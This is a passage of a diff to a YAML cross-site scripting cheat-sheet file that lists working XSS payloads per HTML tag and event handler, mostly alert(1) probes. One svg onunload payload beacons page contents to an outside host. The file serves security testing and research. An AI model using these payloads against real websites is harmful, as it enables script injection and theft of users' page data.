     - <select onbeforecut="alert(1)" contenteditable>test</select>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5868,7 +5197,6 @@ select:
   onchange:
     payloads:
     - <select onchange=alert(1)><option>change me</option><option>XSS</option></select>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5877,7 +5205,6 @@ select:
   onfocus:
     payloads:
     - <select autofocus onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5886,7 +5213,6 @@ select:
   onfocusin:
     payloads:
     - <select autofocus onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5895,7 +5221,6 @@ select:
   onpaste:
     payloads:
     - <select onpaste="alert(1)" contenteditable>test</select>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5905,7 +5230,6 @@ set:
   onbegin:
     payloads:
     - <svg><set onbegin=alert(1) attributename=x dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5914,7 +5238,6 @@ set:
   onend:
     payloads:
     - <svg><set onend=alert(1) attributename=x dur=1s>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5923,7 +5246,6 @@ set:
   onrepeat:
     payloads:
     - <svg><set onrepeat=alert(1) attributename=x dur=1s repeatcount=2>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5933,7 +5255,6 @@ shadow:
   onbeforecopy:
     payloads:
     - <shadow onbeforecopy="alert(1)" contenteditable>test</shadow>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5942,7 +5263,6 @@ shadow:
   onbeforecut:
     payloads:
     - <shadow onbeforecut="alert(1)" contenteditable>test</shadow>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5951,7 +5271,6 @@ shadow:
   onfocus:
     payloads:
     - <shadow id=x tabindex=1 onfocus=alert(1)></shadow>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5959,7 +5278,6 @@ shadow:
   onfocusin:
     payloads:
     - <shadow id=x tabindex=1 onfocusin=alert(1)></shadow>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -5967,7 +5285,6 @@ shadow:
   onpaste:
     payloads:
     - <shadow onpaste="alert(1)" contenteditable>test</shadow>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5977,7 +5294,6 @@ slot:
   onbeforecopy:
     payloads:
     - <slot onbeforecopy="alert(1)" contenteditable>test</slot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5986,7 +5302,6 @@ slot:
   onbeforecut:
     payloads:
     - <slot onbeforecut="alert(1)" contenteditable>test</slot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -5995,7 +5310,6 @@ slot:
   onfocus:
     payloads:
     - <slot id=x tabindex=1 onfocus=alert(1)></slot>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6003,7 +5317,6 @@ slot:
   onfocusin:
     payloads:
     - <slot id=x tabindex=1 onfocusin=alert(1)></slot>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6011,7 +5324,6 @@ slot:
   onpaste:
     payloads:
     - <slot onpaste="alert(1)" contenteditable>test</slot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6021,7 +5333,6 @@ small:
   onbeforecopy:
     payloads:
     - <small onbeforecopy="alert(1)" contenteditable>test</small>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6030,7 +5341,6 @@ small:
   onbeforecut:
     payloads:
     - <small onbeforecut="alert(1)" contenteditable>test</small>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6039,7 +5349,6 @@ small:
   onfocus:
     payloads:
     - <small id=x tabindex=1 onfocus=alert(1)></small>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6047,7 +5356,6 @@ small:
   onfocusin:
     payloads:
     - <small id=x tabindex=1 onfocusin=alert(1)></small>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6055,7 +5363,6 @@ small:
   onpaste:
     payloads:
     - <small onpaste="alert(1)" contenteditable>test</small>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6065,7 +5372,6 @@ source:
   onbeforecopy:
     payloads:
     - <source onbeforecopy="alert(1)" contenteditable>test</source>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6074,7 +5380,6 @@ source:
   onbeforecut:
     payloads:
     - <source onbeforecut="alert(1)" contenteditable>test</source>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6083,7 +5388,6 @@ source:
   onerror:
     payloads:
     - <video><source onerror=alert(1) src=1></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6092,7 +5396,6 @@ source:
   onfocus:
     payloads:
     - <source id=x tabindex=1 onfocus=alert(1)></source>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6100,7 +5403,6 @@ source:
   onfocusin:
     payloads:
     - <source id=x tabindex=1 onfocusin=alert(1)></source>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6108,7 +5410,6 @@ source:
   onpaste:
     payloads:
     - <source onpaste="alert(1)" contenteditable>test</source>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6118,7 +5419,6 @@ spacer:
   onbeforecopy:
     payloads:
     - <spacer onbeforecopy="alert(1)" contenteditable>test</spacer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6127,7 +5427,6 @@ spacer:
   onbeforecut:
     payloads:
     - <spacer onbeforecut="alert(1)" contenteditable>test</spacer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6136,7 +5435,6 @@ spacer:
   onfocus:
     payloads:
     - <spacer id=x tabindex=1 onfocus=alert(1)></spacer>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6144,7 +5442,6 @@ spacer:
   onfocusin:
     payloads:
     - <spacer id=x tabindex=1 onfocusin=alert(1)></spacer>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6152,7 +5449,6 @@ spacer:
   onpaste:
     payloads:
     - <spacer onpaste="alert(1)" contenteditable>test</spacer>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6162,7 +5458,6 @@ span:
   onbeforecopy:
     payloads:
     - <span onbeforecopy="alert(1)" contenteditable>test</span>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6171,7 +5466,6 @@ span:
   onbeforecut:
     payloads:
     - <span onbeforecut="alert(1)" contenteditable>test</span>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6180,7 +5474,6 @@ span:
   onfocus:
     payloads:
     - <span id=x tabindex=1 onfocus=alert(1)></span>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6188,7 +5481,6 @@ span:
   onfocusin:
     payloads:
     - <span id=x tabindex=1 onfocusin=alert(1)></span>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6196,7 +5488,6 @@ span:
   onpaste:
     payloads:
     - <span onpaste="alert(1)" contenteditable>test</span>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6206,7 +5497,6 @@ strike:
   onbeforecopy:
     payloads:
     - <strike onbeforecopy="alert(1)" contenteditable>test</strike>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6215,7 +5505,6 @@ strike:
   onbeforecut:
     payloads:
     - <strike onbeforecut="alert(1)" contenteditable>test</strike>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6224,7 +5513,6 @@ strike:
   onfocus:
     payloads:
     - <strike id=x tabindex=1 onfocus=alert(1)></strike>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6232,7 +5520,6 @@ strike:
   onfocusin:
     payloads:
     - <strike id=x tabindex=1 onfocusin=alert(1)></strike>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6240,7 +5527,6 @@ strike:
   onpaste:
     payloads:
     - <strike onpaste="alert(1)" contenteditable>test</strike>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6250,7 +5536,6 @@ strong:
   onbeforecopy:
     payloads:
     - <strong onbeforecopy="alert(1)" contenteditable>test</strong>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6259,7 +5544,6 @@ strong:
   onbeforecut:
     payloads:
     - <strong onbeforecut="alert(1)" contenteditable>test</strong>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6268,7 +5552,6 @@ strong:
   onfocus:
     payloads:
     - <strong id=x tabindex=1 onfocus=alert(1)></strong>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6276,7 +5559,6 @@ strong:
   onfocusin:
     payloads:
     - <strong id=x tabindex=1 onfocusin=alert(1)></strong>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6284,7 +5566,6 @@ strong:
   onpaste:
     payloads:
     - <strong onpaste="alert(1)" contenteditable>test</strong>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6294,7 +5575,6 @@ style:
   onbeforecopy:
     payloads:
     - <style onbeforecopy="alert(1)" contenteditable style=display:block>test</style>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6303,7 +5583,6 @@ style:
   onbeforecut:
     payloads:
     - <style onbeforecut="alert(1)" contenteditable style=display:block>test</style>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6312,7 +5591,6 @@ style:
   onfocus:
     payloads:
     - <style id=x tabindex=1 onfocus=alert(1) style=display:block></style>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6320,7 +5598,6 @@ style:
   onfocusin:
     payloads:
     - <style id=x tabindex=1 onfocusin=alert(1) style=display:block></style>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6328,7 +5605,6 @@ style:
   onload:
     payloads:
     - <style onload=alert(1)></style>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6337,7 +5613,6 @@ style:
   onpaste:
     payloads:
     - <style onpaste="alert(1)" contenteditable style=display:block style=display:block>test</style>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6347,7 +5622,6 @@ sub:
   onbeforecopy:
     payloads:
     - <sub onbeforecopy="alert(1)" contenteditable>test</sub>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6356,7 +5630,6 @@ sub:
   onbeforecut:
     payloads:
     - <sub onbeforecut="alert(1)" contenteditable>test</sub>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6365,7 +5638,6 @@ sub:
   onfocus:
     payloads:
     - <sub id=x tabindex=1 onfocus=alert(1)></sub>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6373,7 +5645,6 @@ sub:
   onfocusin:
     payloads:
     - <sub id=x tabindex=1 onfocusin=alert(1)></sub>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6381,7 +5652,6 @@ sub:
   onpaste:
     payloads:
     - <sub onpaste="alert(1)" contenteditable>test</sub>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6391,7 +5661,6 @@ summary:
   onbeforecopy:
     payloads:
     - <summary onbeforecopy="alert(1)" contenteditable>test</summary>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6400,7 +5669,6 @@ summary:
   onbeforecut:
     payloads:
     - <summary onbeforecut="alert(1)" contenteditable>test</summary>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6409,7 +5677,6 @@ summary:
   onfocus:
     payloads:
     - <summary id=x tabindex=1 onfocus=alert(1)></summary>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6417,7 +5684,6 @@ summary:
   onfocusin:
     payloads:
     - <summary id=x tabindex=1 onfocusin=alert(1)></summary>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6425,7 +5691,6 @@ summary:
   onpaste:
     payloads:
     - <summary onpaste="alert(1)" contenteditable>test</summary>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6435,7 +5700,6 @@ sup:
   onbeforecopy:
     payloads:
     - <sup onbeforecopy="alert(1)" contenteditable>test</sup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6444,7 +5708,6 @@ sup:
   onbeforecut:
     payloads:
     - <sup onbeforecut="alert(1)" contenteditable>test</sup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6453,7 +5716,6 @@ sup:
   onfocus:
     payloads:
     - <sup id=x tabindex=1 onfocus=alert(1)></sup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6461,7 +5723,6 @@ sup:
   onfocusin:
     payloads:
     - <sup id=x tabindex=1 onfocusin=alert(1)></sup>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6469,7 +5730,6 @@ sup:
   onpaste:
     payloads:
     - <sup onpaste="alert(1)" contenteditable>test</sup>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6479,7 +5739,6 @@ svg:
   onbeforecopy:
     payloads:
     - <svg onbeforecopy="alert(1)" contenteditable>test</svg>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6488,7 +5747,6 @@ svg:
   onbeforecut:
     payloads:
     - <svg onbeforecut="alert(1)" contenteditable>test</svg>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6497,7 +5755,6 @@ svg:
   onfocus:
     payloads:
     - <svg id=x onfocus=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6505,7 +5762,6 @@ svg:
   onfocusin:
     payloads:
     - <svg id=x onfocusin=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6513,7 +5769,6 @@ svg:
   onload:
     payloads:
     - <svg onload=alert(1)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6522,7 +5777,6 @@ svg:
   onpaste:
     payloads:
     - <svg onpaste="alert(1)" contenteditable>test</svg>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6531,7 +5785,6 @@ svg:
   onunload:
     payloads:
     - <svg onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6539,7 +5792,6 @@ table:
   onbeforecopy:
     payloads:
     - <table onbeforecopy="alert(1)" contenteditable>test</table>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6548,7 +5800,6 @@ table:
   onbeforecut:
     payloads:
     - <table onbeforecut="alert(1)" contenteditable>test</table>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6557,7 +5808,6 @@ table:
   onfocus:
     payloads:
     - <table id=x tabindex=1 onfocus=alert(1)></table>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6565,7 +5815,6 @@ table:
   onfocusin:
     payloads:
     - <table id=x tabindex=1 onfocusin=alert(1)></table>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6573,7 +5822,6 @@ table:
   onpaste:
     payloads:
     - <table onpaste="alert(1)" contenteditable>test</table>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6583,7 +5831,6 @@ tbody:
   onbeforecopy:
     payloads:
     - <tbody onbeforecopy="alert(1)" contenteditable>test</tbody>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6592,7 +5839,6 @@ tbody:
   onbeforecut:
     payloads:
     - <tbody onbeforecut="alert(1)" contenteditable>test</tbody>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6601,7 +5847,6 @@ tbody:
   onfocus:
     payloads:
     - <tbody id=x tabindex=1 onfocus=alert(1)></tbody>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6609,7 +5854,6 @@ tbody:
   onfocusin:
     payloads:
     - <tbody id=x tabindex=1 onfocusin=alert(1)></tbody>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6617,7 +5861,6 @@ tbody:
   onpaste:
     payloads:
     - <tbody onpaste="alert(1)" contenteditable>test</tbody>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6627,7 +5870,6 @@ td:
   onbeforecopy:
     payloads:
     - <td onbeforecopy="alert(1)" contenteditable>test</td>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6636,7 +5878,6 @@ td:
   onbeforecut:
     payloads:
     - <td onbeforecut="alert(1)" contenteditable>test</td>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6645,7 +5886,6 @@ td:
   onfocus:
     payloads:
     - <td id=x tabindex=1 onfocus=alert(1)></td>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6653,7 +5893,6 @@ td:
   onfocusin:
     payloads:
     - <td id=x tabindex=1 onfocusin=alert(1)></td>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6661,7 +5900,6 @@ td:
   onpaste:
     payloads:
     - <td onpaste="alert(1)" contenteditable>test</td>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6671,7 +5909,6 @@ template:
   onbeforecopy:
     payloads:
     - <template onbeforecopy="alert(1)" contenteditable>test</template>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6680,7 +5917,6 @@ template:
   onbeforecut:
     payloads:
     - <template onbeforecut="alert(1)" contenteditable>test</template>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6689,7 +5925,6 @@ template:
   onfocus:
     payloads:
     - <template id=x tabindex=1 onfocus=alert(1)></template>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6697,7 +5932,6 @@ template:
   onfocusin:
     payloads:
     - <template id=x tabindex=1 onfocusin=alert(1)></template>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6705,7 +5939,6 @@ template:
   onpaste:
     payloads:
     - <template onpaste="alert(1)" contenteditable>test</template>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6715,7 +5948,6 @@ textarea:
   onauxclick:
     payloads:
     - <textarea onauxclick=alert(1)>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6723,7 +5955,6 @@ textarea:
   onbeforecopy:
     payloads:
     - <textarea onbeforecopy=alert(1) autofocus>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6732,7 +5963,6 @@ textarea:
   onbeforecut:
     payloads:
     - <textarea onbeforecut=alert(1) autofocus>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6741,7 +5971,6 @@ textarea:
   onchange:
     payloads:
     - <textarea onchange=alert(1)>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6750,7 +5979,6 @@ textarea:
   onfocus:
     payloads:
     - <textarea autofocus onfocus=alert(1)>test</textarea>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6759,7 +5987,6 @@ textarea:
   onfocusin:
     payloads:
     - <textarea autofocus onfocusin=alert(1)>test</textarea>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6768,7 +5995,6 @@ textarea:
   oninput:
     payloads:
     - <textarea oninput=alert(1)>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6776,8 +6002,6 @@ textarea:
     - safari
   oninvalid:
     payloads:
-    - <form><textarea oninvalid=alert(1) required><input type=submit>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6786,7 +6010,6 @@ textarea:
   onpaste:
     payloads:
     - <textarea onpaste=alert(1) autofocus></textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6795,7 +6018,6 @@ textarea:
   onselect:
     payloads:
     - <textarea onselect=alert(1) autofocus>XSS</textarea>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6805,7 +6027,6 @@ tfoot:
   onbeforecopy:
     payloads:
     - <tfoot onbeforecopy="alert(1)" contenteditable>test</tfoot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6814,7 +6035,6 @@ tfoot:
   onbeforecut:
     payloads:
     - <tfoot onbeforecut="alert(1)" contenteditable>test</tfoot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6823,7 +6043,6 @@ tfoot:
   onfocus:
     payloads:
     - <tfoot id=x tabindex=1 onfocus=alert(1)></tfoot>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6831,7 +6050,6 @@ tfoot:
   onfocusin:
     payloads:
     - <tfoot id=x tabindex=1 onfocusin=alert(1)></tfoot>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6839,7 +6057,6 @@ tfoot:
   onpaste:
     payloads:
     - <tfoot onpaste="alert(1)" contenteditable>test</tfoot>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6849,7 +6066,6 @@ th:
   onbeforecopy:
     payloads:
     - <th onbeforecopy="alert(1)" contenteditable>test</th>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6858,7 +6074,6 @@ th:
   onbeforecut:
     payloads:
     - <th onbeforecut="alert(1)" contenteditable>test</th>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6867,7 +6082,6 @@ th:
   onfocus:
     payloads:
     - <th id=x tabindex=1 onfocus=alert(1)></th>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6875,7 +6089,6 @@ th:
   onfocusin:
     payloads:
     - <th id=x tabindex=1 onfocusin=alert(1)></th>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6883,7 +6096,6 @@ th:
   onpaste:
     payloads:
     - <th onpaste="alert(1)" contenteditable>test</th>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6893,7 +6105,6 @@ thead:
   onbeforecopy:
     payloads:
     - <thead onbeforecopy="alert(1)" contenteditable>test</thead>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6902,7 +6113,6 @@ thead:
   onbeforecut:
     payloads:
     - <thead onbeforecut="alert(1)" contenteditable>test</thead>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6911,7 +6121,6 @@ thead:
   onfocus:
     payloads:
     - <thead id=x tabindex=1 onfocus=alert(1)></thead>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6919,7 +6128,6 @@ thead:
   onfocusin:
     payloads:
     - <thead id=x tabindex=1 onfocusin=alert(1)></thead>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6927,7 +6135,6 @@ thead:
   onpaste:
     payloads:
     - <thead onpaste="alert(1)" contenteditable>test</thead>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6937,7 +6144,6 @@ time:
   onbeforecopy:
     payloads:
     - <time onbeforecopy="alert(1)" contenteditable>test</time>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6946,7 +6152,6 @@ time:
   onbeforecut:
     payloads:
     - <time onbeforecut="alert(1)" contenteditable>test</time>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6955,7 +6160,6 @@ time:
   onfocus:
     payloads:
     - <time id=x tabindex=1 onfocus=alert(1)></time>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6963,7 +6167,6 @@ time:
   onfocusin:
     payloads:
     - <time id=x tabindex=1 onfocusin=alert(1)></time>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -6971,7 +6174,6 @@ time:
   onpaste:
     payloads:
     - <time onpaste="alert(1)" contenteditable>test</time>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6981,7 +6183,6 @@ title:
   onbeforecopy:
     payloads:
     - <title onbeforecopy="alert(1)" contenteditable>test</title>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6990,7 +6191,6 @@ title:
   onbeforecut:
     payloads:
     - <title onbeforecut="alert(1)" contenteditable>test</title>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -6999,7 +6199,6 @@ title:
   onfocus:
     payloads:
     - <title id=x tabindex=1 onfocus=alert(1)></title>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7007,7 +6206,6 @@ title:
   onfocusin:
     payloads:
     - <title id=x tabindex=1 onfocusin=alert(1)></title>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7015,7 +6213,6 @@ title:
   onpaste:
     payloads:
     - <title onpaste="alert(1)" contenteditable>test</title>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7025,7 +6222,6 @@ tr:
   onbeforecopy:
     payloads:
     - <tr onbeforecopy="alert(1)" contenteditable>test</tr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7034,7 +6230,6 @@ tr:
   onbeforecut:
     payloads:
     - <tr onbeforecut="alert(1)" contenteditable>test</tr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7043,7 +6238,6 @@ tr:
   onfocus:
     payloads:
     - <tr id=x tabindex=1 onfocus=alert(1)></tr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7051,7 +6245,6 @@ tr:
   onfocusin:
     payloads:
     - <tr id=x tabindex=1 onfocusin=alert(1)></tr>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7059,7 +6252,6 @@ tr:
   onpaste:
     payloads:
     - <tr onpaste="alert(1)" contenteditable>test</tr>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7069,7 +6261,6 @@ track:
   onbeforecopy:
     payloads:
     - <track onbeforecopy="alert(1)" contenteditable>test</track>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7078,7 +6269,6 @@ track:
   onbeforecut:
     payloads:
     - <track onbeforecut="alert(1)" contenteditable>test</track>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7088,14 +6278,12 @@ track:
     payloads:
     - "<video controls><source src=validvideo.mp4 type=video/mp4><track default oncuechange=alert(1)
       src=\"data:text/vtt,WEBVTT FILE\n\n1\n00:00:00.000 --> 00:00:05.000 \n<b>XSS</b>\n\"></video>"
-    required: []
     interaction: false
     browsers:
     - chrome
   onfocus:
     payloads:
     - <track id=x tabindex=1 onfocus=alert(1)></track>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7103,7 +6291,6 @@ track:
   onfocusin:
     payloads:
     - <track id=x tabindex=1 onfocusin=alert(1)></track>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7111,7 +6298,6 @@ track:
   onload:
     payloads:
     - <video><track default onload=alert(1) src="data:text/vtt,WEBVTT"></video>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7120,7 +6306,6 @@ track:
   onpaste:
     payloads:
     - <track onpaste="alert(1)" contenteditable>test</track>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7130,7 +6315,6 @@ tt:
   onbeforecopy:
     payloads:
     - <tt onbeforecopy="alert(1)" contenteditable>test</tt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7139,7 +6323,6 @@ tt:
   onbeforecut:
     payloads:
     - <tt onbeforecut="alert(1)" contenteditable>test</tt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7148,7 +6331,6 @@ tt:
   onfocus:
     payloads:
     - <tt id=x tabindex=1 onfocus=alert(1)></tt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7156,7 +6338,6 @@ tt:
   onfocusin:
     payloads:
     - <tt id=x tabindex=1 onfocusin=alert(1)></tt>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7164,7 +6345,6 @@ tt:
   onpaste:
     payloads:
     - <tt onpaste="alert(1)" contenteditable>test</tt>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7174,7 +6354,6 @@ u:
   onbeforecopy:
     payloads:
     - <u onbeforecopy="alert(1)" contenteditable>test</u>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7183,7 +6362,6 @@ u:
   onbeforecut:
     payloads:
     - <u onbeforecut="alert(1)" contenteditable>test</u>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7192,7 +6370,6 @@ u:
   onfocus:
     payloads:
     - <u id=x tabindex=1 onfocus=alert(1)></u>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7200,7 +6377,6 @@ u:
   onfocusin:
     payloads:
     - <u id=x tabindex=1 onfocusin=alert(1)></u>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7208,7 +6384,6 @@ u:
   onpaste:
     payloads:
     - <u onpaste="alert(1)" contenteditable>test</u>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7218,7 +6393,6 @@ ul:
   onbeforecopy:
     payloads:
     - <ul onbeforecopy="alert(1)" contenteditable>test</ul>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7227,7 +6401,6 @@ ul:
   onbeforecut:
     payloads:
     - <ul onbeforecut="alert(1)" contenteditable>test</ul>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7236,7 +6409,6 @@ ul:
   onfocus:
     payloads:
     - <ul id=x tabindex=1 onfocus=alert(1)></ul>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7244,7 +6416,6 @@ ul:
   onfocusin:
     payloads:
     - <ul id=x tabindex=1 onfocusin=alert(1)></ul>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7252,7 +6423,6 @@ ul:
   onpaste:
     payloads:
     - <ul onpaste="alert(1)" contenteditable>test</ul>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7262,7 +6432,6 @@ var:
   onbeforecopy:
     payloads:
     - <var onbeforecopy="alert(1)" contenteditable>test</var>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7271,7 +6440,6 @@ var:
   onbeforecut:
     payloads:
     - <var onbeforecut="alert(1)" contenteditable>test</var>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7280,7 +6448,6 @@ var:
   onfocus:
     payloads:
     - <var id=x tabindex=1 onfocus=alert(1)></var>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7288,7 +6455,6 @@ var:
   onfocusin:
     payloads:
     - <var id=x tabindex=1 onfocusin=alert(1)></var>
-    required: []
     interaction: false
     browsers:
     - chrome
@@ -7296,7 +6462,6 @@ var:
   onpaste:
     payloads:
     - <var onpaste="alert(1)" contenteditable>test</var>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7306,7 +6471,6 @@ video:
   onbeforecopy:
     payloads:
     - <video onbeforecopy="alert(1)" contenteditable>test</video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7315,7 +6479,6 @@ video:
   onbeforecut:
     payloads:
     - <video onbeforecut="alert(1)" contenteditable>test</video>
-    required: []
     interaction: true
     browsers:
     - chrome
@@ -7324,7 +6487,6 @@ video:
   oncanplay:
